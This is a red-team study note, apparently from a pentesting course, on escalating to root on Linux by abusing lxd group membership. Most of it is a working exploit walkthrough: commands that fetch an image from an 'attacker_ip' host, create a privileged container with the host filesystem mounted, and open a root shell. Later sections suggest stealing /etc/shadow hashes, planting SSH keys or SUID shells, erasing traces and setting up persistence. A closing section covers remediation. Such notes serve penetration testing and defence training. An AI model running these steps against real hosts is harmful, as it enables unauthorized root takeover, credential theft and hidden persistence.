---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.20 LXC LXD Group Abuse"
---

# 44.20 LXC / LXD Group Abuse

## 1. Introduction

LXC (Linux Containers) and its management daemon, LXD, provide an environment for running multiple isolated Linux systems (containers) on a single control host. Similar to Docker, LXD relies on a privileged daemon that interacts directly with the host kernel to manage these containers.

To allow non-root users to manage containers, administrators often add users to the `lxd` or `lxc` group. This is a critical security risk. Membership in the `lxd` group provides the user with the ability to create and configure containers. By deploying a specially crafted container and mounting the host's root filesystem into it, a user in the `lxd` group can achieve full root access over the host machine.

## 2. Core Concepts and Underlying Mechanisms

The underlying vulnerability mechanics are nearly identical to Docker group abuse but require different tooling and image formats.

### 2.1 The LXD Daemon
The LXD daemon runs as `root`. When a member of the `lxd` group issues a command via the `lxc` client, the daemon executes it without requiring further authentication.

### 2.2 Security Privileges and Mounts
By default, LXD containers are unprivileged (user namespaces are used). However, a user in the `lxd` group has the authority to configure a container to run in "privileged" mode (setting `security.privileged=true`). In a privileged container, the `root` user inside the container corresponds directly to the `root` user on the host system. 
By mounting the host's filesystem (`/`) into this privileged container, the attacker can read, write, and execute files on the host as root.

## 3. Technical Breakdown and Architecture

The following ASCII diagram illustrates the exploitation path of LXD group abuse.

```text
+-------------------------------------------------------------------------+
|                      LXD GROUP ABUSE ARCHITECTURE                       |
|                                                                         |
|  [ Host Machine ]                                                       |
|  User 'dev' (Member of 'lxd' group)                                     |
|         |                                                               |
|  1. Imports alpine image                                                |
|  2. Initializes container 'ignite' (security.privileged=true)           |
|  3. Mounts Host / to Container /mnt/root                                |
|  4. Starts 'ignite'                                                     |
|         |                                                               |
|         +----[ LXD Unix Socket ]----> [ lxd daemon (root) ]             |
|                                                |                        |
|                                                v                        |
|  +--------------------------------------------------------------+       |
|  | [ LXC Container 'ignite' ]                                   |       |
|  | Runs as Privileged (root mapped to host root)                |       |
|  |                                                              |       |
|  | /mnt/root/ <=========== Bound to ===========> Host's /       |       |
|  |                                                              |       |
|  | Attacker executes:                                           |       |
|  | $ lxc exec ignite -- sh                                      |       |
|  | # cd /mnt/root                                               |       |
|  | # nano etc/shadow (Modifies host password)                   |       |
|  +--------------------------------------------------------------+       |
|                                                                         |
+-------------------------------------------------------------------------+
```

## 4. Enumeration Strategy

Enumeration involves verifying group membership and assessing the state of the LXD installation.

### 4.1 Checking Group Membership
Verify if the current user belongs to the `lxd` or `lxc` group:
```bash
id
# Output: uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)
```

### 4.2 Enumerating LXD Configuration
Check the installed versions and current containers to ensure LXD is initialized and running:
```bash
lxc --version
lxc list
lxc image list
```
If `lxc list` returns an error about LXD not being initialized, you may need to initialize it yourself by running `lxd init` and accepting the default prompts (though this is noisy and alters system state).

## 5. Exploitation Methodology

Unlike Docker, where pulling an image is often a single command, LXD environments on isolated networks require you to build an image locally, transfer it, and import it.

### 5.1 Step 1: Building the Alpine Image (On Attacker Machine)
Because the target likely lacks internet access or the ability to resolve LXD image servers, we build a minimal Alpine Linux image locally.
Download the Alpine builder repository:
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```
This script will produce a tar.gz file, e.g., `alpine-v3.13-x86_64-20210218_0139.tar.gz`.

### 5.2 Step 2: Transferring the Image
Transfer the generated tarball to the target machine (via Python HTTP server, `scp`, `wget`, etc.).
```bash
# On Attacker: python3 -m http.server 80
# On Target: wget http://attacker_ip/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

### 5.3 Step 3: Importing the Image to LXD
Import the tarball into the local LXD image repository and assign it an alias (e.g., `myimage`).
```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```
Verify the import:
```bash
lxc image list
```

### 5.4 Step 4: Initializing and Configuring the Container
Initialize a new container from the imported image. We will name the container `ignite`. Crucially, we use the `-c security.privileged=true` flag to disable user namespace mapping.
```bash
lxc init myimage ignite -c security.privileged=true
```

Configure the container to mount the host's root filesystem (`/`) into the container at the path `/mnt/root`.
```bash
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

### 5.5 Step 5: Starting the Container and Gaining Root
Start the container:
```bash
lxc start ignite
```
Execute an interactive shell inside the container:
```bash
lxc exec ignite /bin/sh
```
Once inside, you are root. Navigate to the mounted host filesystem:
```bash
cd /mnt/root
```
You now have full read/write access to the host's root filesystem. You can extract the `/etc/shadow` hashes, insert an SSH key into `/root/.ssh/authorized_keys`, or copy a shell to `/mnt/root/tmp/` and make it SUID.

## 6. Edge Cases and Bypasses

- **LXD Not Initialized**: If LXD is installed but `lxd init` was never run, the attacker can simply run `lxd init --auto` to set up the default networking and storage pools required to launch containers.
- **Internet Access Available**: If the target has internet access and can reach the public LXD image servers, the exploitation is much faster. You skip the local building step and simply run:
  ```bash
  lxc launch ubuntu:18.04 ignite -c security.privileged=true
  lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
  lxc restart ignite
  lxc exec ignite /bin/bash
  ```
- **Snap Installations**: On modern Ubuntu distributions, LXD is often installed via Snap. The commands (`lxc`) remain identical, but the underlying socket and daemon paths are located in `/var/snap/lxd/common/lxd/`.

## 7. Post-Exploitation & Persistence

After compromising the host:
- **Cleanup**: It is vital to stop and delete the malicious container to erase your tracks. Leaving a rogue container running is a massive IOC (Indicator of Compromise).
  ```bash
  lxc stop ignite
  lxc rm ignite
  lxc image rm myimage
  ```
- **Persistence**: Install traditional persistence mechanisms directly on the host (SSH keys, modified cron jobs) rather than relying on LXD.

## 8. Defense & Remediation

The mitigation strategy mirrors that of Docker:
- **Restrict Group Membership**: Treat the `lxd` and `lxc` groups as equivalent to the `root` user. Never add untrusted users or developers to these groups.
- **Use Sudo Constraints**: If specific users need to start or stop specific containers, configure highly restricted `sudo` rules for those precise `lxc` commands, explicitly denying commands like `lxc config` or `lxc init`.
- **Enforce Unprivileged Containers**: Configure the LXD daemon to reject the creation of privileged containers. This forces all containers to use user namespaces, meaning the root user inside the container maps to a high-numbered, unprivileged UID on the host (e.g., UID 100000). If an attacker mounts the host filesystem into an unprivileged container, they will be treated as the `nobody` user and will not have root permissions.

## 9. Chaining Opportunities

LXD group abuse frequently chains with:
- **SSH Credential Stuffing**: Compromising a low-privileged user via SSH password reuse, checking `id`, and finding they are in the `lxd` group.
- **Web Shells**: Gaining a web shell as `www-data`, finding a local user account script with hardcoded credentials, moving laterally to that user, and leveraging their `lxd` group membership for root.

## 10. Related Notes
- [[19 - Docker Group Membership]]
- [[21 - Disk Group Reading Raw Device Files]]
- [[45 - Container Escapes]]
- [[01 - SUID and SGID Binaries]]
